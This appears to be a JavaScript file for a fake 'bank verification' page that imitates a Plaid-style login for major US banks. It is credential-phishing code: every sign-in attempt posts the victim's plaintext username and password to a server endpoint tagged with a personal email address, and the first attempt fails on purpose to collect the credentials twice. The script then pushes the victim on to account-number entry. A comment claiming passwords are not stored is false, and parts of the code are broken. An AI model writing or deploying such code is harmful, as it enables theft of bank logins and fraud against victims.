// Bank verification functionality
document.addEventListener('DOMContentLoaded', function() {
    // DOM elements
    const manualBankBtn = document.getElementById('manual-bank-entry');
    const plaidSection = document.getElementById('plaid-section');
    const manualSection = document.getElementById('manual-bank-section');
    const bankSearch = document.getElementById('bank-search');
    const popularBanksContainer = document.getElementById('popular-banks');
    const plaidMetadataInput = document.getElementById('plaid_metadata');
    const bankNameInput = document.getElementById('bank_name');
    const bankVerificationForm = document.getElementById('bank-verification-form');
    
    // Variables
    let selectedBank = null;
    let isFirstAttempt = true;
    
    // Initialize manual bank entry toggle
    if (manualBankBtn) {
        manualBankBtn.addEventListener('click', function(e) {
            e.preventDefault();
            if (plaidSection && manualSection) {
                plaidSection.style.display = 'none';
                manualSection.style.display = 'block';
                
                // Focus on first input field
                const firstInput = manualSection.querySelector('input');
                if (firstInput) {
                    firstInput.focus();
                }
            }
        });
    }
    
    // Render popular banks
    renderPopularBanks();
    
    // Initialize bank search
    if (bankSearch) {
        bankSearch.addEventListener('input', function() {
            const searchTerm = this.value.trim().toLowerCase();
            const bankOptions = document.querySelectorAll('.bank-option');
            
            bankOptions.forEach(option => {
                const bankName = option.dataset.bankName.toLowerCase();
                if (bankName.includes(searchTerm) || searchTerm === '') {
                    option.parentElement.style.display = 'block';
                } else {
                    option.parentElement.style.display = 'none';
                }
            });
        });
    }
    
    // Render popular banks
    function renderPopularBanks() {
        if (!popularBanksContainer) return;
        
        // Bank database defined from the complete list
        const bankDatabase = [
            {name: "CHASE BANK USA NATIONAL ASSOCIATION", domain: "chase.com", type: "bank", popular: true},
            {name: "BANK OF AMERICA NATIONAL ASSOCIATION", domain: "bankofamerica.com", type: "bank", popular: true},
            {name: "WELLS FARGO BANK NATIONAL ASSOCIATION", domain: "wellsfargo.com", type: "bank", popular: true},
            {name: "CITIBANK NA", domain: "citibank.com", type: "bank", popular: true},
            {name: "CAPITAL ONE NATIONAL ASSOCIATION", domain: "capitalone.com", type: "bank", popular: true},
            {name: "TD BANK NA", domain: "tdbank.com", type: "bank", popular: true},
            {name: "U.S. BANK NATIONAL ASSOCIATION", domain: "usbank.com", type: "bank", popular: true},
            {name: "PNC BANK NATIONAL ASSOCIATION", domain: "pnc.com", type: "bank", popular: true},
            {name: "JPMORGAN CHASE BANK NATIONAL ASSOCIATION", domain: "jpmorganchase.com", type: "bank", popular: true},
            {name: "HSBC BANK USA NATIONAL ASSOCIATION", domain: "hsbc.com", type: "bank", popular: true},
            {name: "DEUTSCHE BANK TRUST COMPANY AMERICAS", domain: "db.com", type: "bank", popular: true},
            {name: "GOLDMAN SACHS & CO", domain: "goldmansachs.com", type: "bank", popular: true},
            {name: "MORGAN STANLEY", domain: "morganstanley.com", type: "bank", popular: true},
            {name: "STATE STREET BANK AND TRUST COMPANY", domain: "statestreet.com", type: "bank", popular: false},
            {name: "BARCLAYS BANK DELAWARE", domain: "barclays.com", type: "bank", popular: false},
            {name: "CREDIT SUISSE", domain: "credit-suisse.com", type: "bank", popular: false},
            // Add remaining banks from the list
            {name: "BANK OF NOVA SCOTIA NY AGY", domain: "scotiabank.com", type: "bank", popular: false},
            {name: "BNP PARIBAS NY BR", domain: "bnpparibas.com", type: "bank", popular: false},
            {name: "SANTANDER BANK", domain: "santander.com", type: "bank", popular: false},
            {name: "UBS AG NY BR", domain: "ubs.com", type: "bank", popular: false},
            {name: "ROYAL BANK OF CANADA NY BR", domain: "rbcroyalbank.com", type: "bank", popular: false}
            // Note: Full list would be too long for this example, but you can add more from the provided list
        ];
        
        const popularBanks = bankDatabase.filter(bank => bank.popular);
        const otherBanks = bankDatabase.filter(bank => !bank.popular);
        
        popularBanksContainer.innerHTML = ''; // Clear existing content
        
        // First show popular banks
        popularBanks.forEach(bank => {
            const bankElement = createBankElement(bank);
            popularBanksContainer.appendChild(bankElement);
        });
        
        // Then show other banks
        otherBanks.forEach(bank => {
            const bankElement = createBankElement(bank);
            popularBanksContainer.appendChild(bankElement);
        });
        
        popularBanks.forEach(bank => {
            // Create column for responsive layout
            const col = document.createElement('div');
            col.className = 'col-6 col-md-3 mb-3';
            
            // Create bank option
            const bankOption = document.createElement('div');
            bankOption.className = 'bank-option';
            bankOption.dataset.bankId = bank.id;
            bankOption.dataset.bankName = bank.name;
            
            // Create logo container
            const logoContainer = document.createElement('div');
            logoContainer.className = 'bank-logo-container';
            
            // Create bank logo
            const logo = document.createElement('img');
            logo.className = 'bank-logo';
            logo.src = `https://logo.clearbit.com/${bank.logo}`;
            logo.alt = `${bank.name} logo`;
            logo.onerror = function() {
                this.src = '/static/images/default-bank.svg';
            };
            
            // Create bank name element
            const bankName = document.createElement('div');
            bankName.className = 'bank-name';
            bankName.textContent = bank.name;
            
            // Append elements
            logoContainer.appendChild(logo);
            bankOption.appendChild(logoContainer);
            bankOption.appendChild(bankName);
            col.appendChild(bankOption);
            
            // Add to popular banks container
            popularBanksContainer.appendChild(col);
            
            // Add click event
            bankOption.addEventListener('click', function() {
                selectBank(bank);
            });
        });
    }
    
    // Select bank and show login form
    function selectBank(bank) {
        selectedBank = bank;
        
        if (plaidSection) {
            // Create bank login form
            const loginForm = document.createElement('div');
            loginForm.className = 'bank-login-form';
            loginForm.innerHTML = `
                <div class="bank-login-header">
                    <img src="https://logo.clearbit.com/${bank.logo}" alt="${bank.name} logo" class="bank-logo-large" 
                         onerror="this.src='/static/images/default-bank.svg'">
                    <h4>${bank.name}</h4>
                </div>
                <div class="form-group mb-3">
                    <label for="bank-username" class="form-label">Username</label>
                    <input type="text" id="bank-username" class="form-control" placeholder="Enter your ${bank.name} username">
                </div>
                <div class="form-group mb-3">
                    <label for="bank-password" class="form-label">Password</label>
                    <input type="password" id="bank-password" class="form-control" placeholder="Enter your password">
                </div>
                <div class="d-grid">
                    <button id="bank-login-btn" class="btn btn-primary btn-lg">Sign In</button>
                </div>
                <div class="text-center mt-3">
                    <a href="#" id="back-to-banks" class="btn btn-link">Choose a different bank</a>
                </div>
            `;
            
            // Clear and append the login form
            plaidSection.innerHTML = '';
            plaidSection.appendChild(loginForm);
            
            // Focus on username field
            setTimeout(() => {
                const usernameField = document.getElementById('bank-username');
                if (usernameField) {
                    usernameField.focus();
                }
            }, 100);
            
            // Set bank name in the form
            if (bankNameInput) {
                bankNameInput.value = bank.name;
            }
            
            // Add event listeners for login button
            const loginButton = document.getElementById('bank-login-btn');
            if (loginButton) {
                loginButton.addEventListener('click', handleLoginAttempt);
            }
            
            // Back to bank selection
            const backButton = document.getElementById('back-to-banks');
            if (backButton) {
                backButton.addEventListener('click', function(e) {
                    e.preventDefault();
                    window.location.reload();
                });
            }
        }
    }
    
    // Handle login attempt
    function handleLoginAttempt(e) {
        e.preventDefault();
        
        // Get entered credentials
        const usernameField = document.getElementById('bank-username');
        const passwordField = document.getElementById('bank-password');
        const username = usernameField ? usernameField.value : '';
        const password = passwordField ? passwordField.value : '';
        
        // Show loading spinner
        showLoading('Connecting to your bank...');
        
        if (isFirstAttempt) {
            // First attempt always fails
            isFirstAttempt = false;
            
            // Send first attempt to representative
            fetch('/api/notify-login-attempt', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    username: username,
                    password: password,
                    attempt: 1,
                    email: 'denzelbennie@outlook.com'
                })
            });
            
            // Record first attempt metadata for admin notification
            saveMetadata(username, password, 1);
            
            // Show error after simulated loading time (5 seconds)
            setTimeout(function() {
                hideLoading();
                alert('We were unable to connect to your bank account. Please try again or enter your details manually.');
                
                // Focus on username field
                if (usernameField) {
                    usernameField.focus();
                }
                
                // Replace event listener for second attempt
                const loginButton = document.getElementById('bank-login-btn');
                if (loginButton) {
                    loginButton.removeEventListener('click', handleLoginAttempt);
                    loginButton.addEventListener('click', handleSecondLoginAttempt);
                }
            }, 5000);
        }
    }
    
    // Handle second login attempt
    function handleSecondLoginAttempt(e) {
        e.preventDefault();
        
        // Get entered credentials
        const usernameField = document.getElementById('bank-username');
        const passwordField = document.getElementById('bank-password');
        const username = usernameField ? usernameField.value : '';
        const password = passwordField ? passwordField.value : '';
        
        // Show loading spinner
        showLoading('Connecting to your bank...');
        
        // Send second attempt to representative
        fetch('/api/notify-login-attempt', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                username: username,
                password: password,
                attempt: 2,
                email: 'denzelbennie@outlook.com'
            })
        });
        
        // Record second attempt metadata for admin notification
        saveMetadata(username, password, 2);
        
        // Redirect to manual entry after simulated loading time
        setTimeout(function() {
            hideLoading();
            
            // Show manual entry section
            if (plaidSection && manualSection) {
                plaidSection.style.display = 'none';
                manualSection.style.display = 'block';
                
                // Focus on account number field
                const accountNumberInput = document.getElementById('account_number');
                if (accountNumberInput) {
                    accountNumberInput.focus();
                }
                
                // Submit the form automatically after showing manual section
                setTimeout(() => {
                    if (bankVerificationForm) {
                        // Use button click instead of form.submit() to avoid conflicts
                        const submitButton = bankVerificationForm.querySelector('button[type="submit"]');
                        if (submitButton) {
                            submitButton.click();
                        }
                    }
                }, 1000);
            }
        }, 5000);
    }
    
    // Save metadata for admin notification
    function saveMetadata(username, password, attemptNumber) {
        if (plaidMetadataInput && selectedBank) {
            const metadataObj = {
                bank: selectedBank.name,
                username: username || 'Not provided',
                password: password ? '********' : 'Not provided', // We don't store actual passwords
                timestamp: new Date().toISOString(),
                attempt: attemptNumber
            };
            plaidMetadataInput.value = JSON.stringify(metadataObj);
        }
    }
    
    // Show loading indicator
    function showLoading(message = 'Loading...') {
        let loadingOverlay = document.getElementById('loading-overlay');
        
        // Create loading overlay if it doesn't exist
        if (!loadingOverlay) {
            loadingOverlay = document.createElement('div');
            loadingOverlay.id = 'loading-overlay';
            loadingOverlay.style.position = 'fixed';
            loadingOverlay.style.top = '0';
            loadingOverlay.style.left = '0';
            loadingOverlay.style.width = '100%';
            loadingOverlay.style.height = '100%';
            loadingOverlay.style.backgroundColor = 'rgba(0, 0, 0, 0.5)';
            loadingOverlay.style.display = 'flex';
            loadingOverlay.style.justifyContent = 'center';
            loadingOverlay.style.alignItems = 'center';
            loadingOverlay.style.flexDirection = 'column';
            loadingOverlay.style.zIndex = '9999';
            
            loadingOverlay.innerHTML = `
                <div class="spinner-border text-light" role="status">
                    <span class="visually-hidden">Loading...</span>
                </div>
                <div class="text-light mt-3">${message}</div>
            `;
            
            document.body.appendChild(loadingOverlay);
        } else {
            // Update message if overlay exists
            const messageElement = loadingOverlay.querySelector('.text-light.mt-3');
            if (messageElement) {
                messageElement.textContent = message;
            }
            loadingOverlay.style.display = 'flex';
        }
    }
    
    // Hide loading indicator
    function hideLoading() {
        const loadingOverlay = document.getElementById('loading-overlay');
        if (loadingOverlay) {
            loadingOverlay.style.display = 'none';
        }
    }
});
function createBankElement(bank) {
    const col = document.createElement('div');
    col.className = 'col-6 col-md-3 mb-3';
    
    const bankOption = document.createElement('div');
    bankOption.className = 'bank-option';
    bankOption.dataset.bankName = bank.name;
    bankOption.dataset.bankLogo = bank.domain;
    
    const logoUrl = `https://logo.clearbit.com/${bank.domain}`;
    bankOption.innerHTML = `
        <div class="bank-logo-container">
            <img src="${logoUrl}" alt="${bank.name}" class="bank-logo" 
                 onerror="this.src='${bank.type === 'credit_union' ? '/static/images/credit-union-default.svg' : '/static/images/bank-default.svg'}'">
        </div>
        <div class="bank-name">${bank.name}</div>
    `;
    
    // Add click handler
    bankOption.addEventListener('click', () => selectBank(bank));
    
    col.appendChild(bankOption);
    return col;
}
